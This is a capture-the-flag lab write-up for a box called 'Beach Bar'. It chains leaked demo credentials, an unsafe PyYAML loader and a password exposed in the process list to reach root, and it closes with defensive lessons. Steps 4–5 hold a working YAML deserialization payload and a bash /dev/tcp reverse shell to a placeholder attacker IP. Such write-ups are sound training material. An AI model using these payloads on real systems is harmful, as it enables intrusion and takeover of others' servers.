# Day 5 — Beach Bar

## Summary

At the Beach Bar, even shell access is complimentary — the jukebox takes requests... *any* kind. A leftover demo login opens the door to a playlist import feature that trusts user-supplied YAML a little too much, turning a simple upload into full remote code execution.

## Objective

Compromise the target machine and retrieve both the **user flag** and the **root flag**.

## Tools / Techniques / Threat Vectors

- Web Reconnaissance (`nmap`, `gobuster`)
- Information Disclosure (hardcoded credentials in HTML comments)
- Insecure YAML Deserialization (CWE-502)
- Remote Code Execution (RCE)
- Privilege Escalation via Exposed Process Arguments

---

## Steps Taken

1. In this room, we are greeted with a login web page after accessing `http://10.48.165.108/`. First, we inspect the page elements to check for any hints or clues left behind by the developers.

![Day 5 Screenshot 1](<image1.png>)

We find a developer comment left in the page source, revealing a set of demo login credentials: **`dj/dj`**. With this noted, we proceed to reconnaissance — scanning for open ports and services on the target IP, and running directory enumeration against the web application.

```bash
nmap -sV <IP_ADDRESS> -oN <output path>
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -oN <output path>
```

![Day 5 Screenshot 2](<image2.png>)
![Day 5 Screenshot 3](<image3.png>)

2. Reviewing the results of both scans, we find that ports 80 and 22 are open, and gobuster reveals several directories beyond the login page, all returning a status code of **302**. This means the paths exist, but the server redirects unauthenticated requests back to the login page. With this information — and the demo credentials found earlier — we attempt to log in using **`dj/dj`**.

![Day 5 Screenshot 4](<image4.png>)

The login succeeds, granting access to the dashboard, which was previously unreachable without authentication.

3. The dashboard exposes **import** and **export** functionality. Testing the export feature first, we download a `playlist.yml` file containing the current playlist data. Next, we examine the import page.

![Day 5 Screenshot 5](<image5.png>)

The import page accepts a playlist either pasted directly in YAML format or uploaded as a `.yml` file. This raises a question: what happens if we try uploading a different file type, such as an image (`.jpg` or `.png`)?

![Day 5 Screenshot 6](<image6.png>)

4. To test this, we attempt to upload an arbitrary image file — in this case, a wallpaper pulled from the AttackBox, though any image file works.

![Day 5 Screenshot 7](<image7.png>)

As expected, the server rejects the file, since it isn't valid YAML:

```text
Could not load playlist: unacceptable character #x001a: special characters are not allowed
  in "<unicode string>", position 6
```

![Day 5 Screenshot 8](<image8.png>)

This error is a strong indicator that the backend is feeding our uploaded file directly into a **YAML parser**. To confirm this — and to test whether the parser is *unsafely* handling YAML — we take the `playlist.yml` file exported earlier and modify the `name` field's value, replacing it with a PyYAML object-construction tag:

```yaml
name: !!python/object/apply:os.system ["id"]
```

![Day 5 Screenshot 9](<image9.png>)

The response confirms the payload executed successfully:

```text
{'playlist': {'name': 0, 'vibe': 'golden hour', 'tracks': [{'artist': 'Khruangbin', 'title': 'Maria Tambien'}, {'artist': 'Men I Trust', 'title': 'Show Me How'}, {'artist': 'Crumb', 'title': 'Locket'}]}}
```

The `'name': 0` value is the key detail: `os.system()` returns the exit code of the command it runs, and `id` exiting successfully returns `0`. This confirms the application is using an **unsafe YAML loader**, allowing us to construct and call arbitrary Python functions — including OS-level commands — simply by uploading a crafted YAML file. This is a textbook **YAML deserialization vulnerability (CWE-502)**.

5. With code execution confirmed, we escalate from a proof-of-concept command to a full reverse shell. We replace `id` in the payload with a command that spawns an interactive shell back to our machine:

```yaml
name: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP_ADDRESS>/1234 0>&1'"]
```

Before uploading this payload, we start a listener on our attacking machine to catch the incoming connection:

```bash
nc -lnvp 1234
```

Once the listener is running, we upload the modified playlist. The server parses the YAML, executes the embedded command, and a connection lands on our listener — giving us a remote shell on the web server.

![Day 5 Screenshot 10](<image10.png>)
![Day 5 Screenshot 11](<image11.png>)

6. With shell access established, we first look for the user flag. Running `whoami` reveals the current user context, which typically corresponds to a home directory at `/home/<username>`. Navigating there with `cd /home/<username>`, we locate and read the user flag.

![Day 5 Screenshot 12](<image12.png>)

6. Now that we have a foothold and found the user flag, let's move on to privilege escalation to try to grab the root flag. Before running any further commands, it's a good idea to upgrade our shell first. A raw reverse shell from netcat is very limited — it has no job control, no tab-completion, and most importantly, commands like `sudo` will fail because they require a proper TTY to read a password securely. We can see this limitation early on:

```text
sh: 0: can't access tty; job control turned off
```

To fix this, we upgrade to a fully interactive shell using Python's built-in `pty` module, which spawns a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This tells Python to allocate a pseudo-TTY and attach `/bin/bash` to it, which tricks the system into treating our shell like a real terminal session.

![Day 5 Screenshot 13](<image13.png>)

7. With a proper shell now, let's check what our current user is allowed to run as other users:

```bash
sudo -l
```

Unfortunately, this prompts for bartender's own password, which we don't have, so this path is a dead end for now:

```text
[sudo] password for bartender:
```

![Day 5 Screenshot 14](<image14.png>)

8. Since we can't escalate directly through `sudo`, let's enumerate the system further. While exploring the web app's directory, we come across a Python script tied to the jukebox streaming service at `/opt/beach-bar/jukeboxd/jukeboxd.py`. The script requires a `--stream-pass` argument to run, but doesn't hardcode the password anywhere in the file itself — meaning something else on the system is launching it with the actual credential.

    ```text
    #!/usr/bin/env python3

    import argparse
    import time

    NOW_PLAYING = [
        "Khruangbin - Maria Tambien",
        "Men I Trust - Show Me How",
        "Crumb - Locket",
        "Mac DeMarco - Chamber of Reflection",
    ]


    def main():
        parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
        parser.add_argument("--stream-pass", required=True, help="stream backend password")
        parser.add_argument("--bitrate", default="320k")
        args = parser.parse_args()

        i = 0
        while True:
            track = NOW_PLAYING[i % len(NOW_PLAYING)]
            i += 1
            time.sleep(30)


    if __name__ == "__main__":
        main()
    ```

A common misconfiguration is passing secrets via command-line arguments, since process arguments are visible to any local user through the process list. Let's check if this script is currently running:

```bash
ps aux | grep jukebox
```

![Day 5 Screenshot 15](<image15.png>)

And there it is — the plaintext password is exposed directly in the process list, running as **root**:

```text
root         610  0.0  0.2  20176 11704 ?        Ss   02:44   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

9. With this password in hand, let's test if it's reused for the root account. Attempting `sudo su` with this password fails, since it's checked against bartender's own password, not root's:

```text
[sudo] password for bartender: SunsetSpritz2024!
Sorry, try again.
```

Instead, let's try switching users directly to root, which checks the password against root's own credentials:

```bash
su root
```

![Day 5 Screenshot 16](<image16.png>)

The password works, granting us a root shell. From here, we navigate to `/root` and retrieve the final flag:

```bash
cd /root
cat root.txt
```

![Day 5 Screenshot 17](<image17.png>)

---

## Lessons Learned

This box demonstrated a full attack chain built from several small, individually low-severity issues compounding into complete system compromise: a developer comment left in production code exposed default credentials, which granted access to a feature that trusted user-supplied YAML enough to parse it with an unsafe loader, allowing arbitrary Python code execution and a foothold on the server. From there, a background service running as root had its password passed via command-line arguments — a common but dangerous practice, since process arguments are visible system-wide via `ps aux` — and that same password turned out to be reused for the root account itself, providing the final path to full privilege escalation. Each step alone might seem minor, but together they highlight why defense-in-depth matters: removing debug comments before deployment, always using `yaml.safe_load()` instead of `yaml.load()`, never passing secrets via CLI arguments, and enforcing unique passwords per account would each have independently broken this chain.
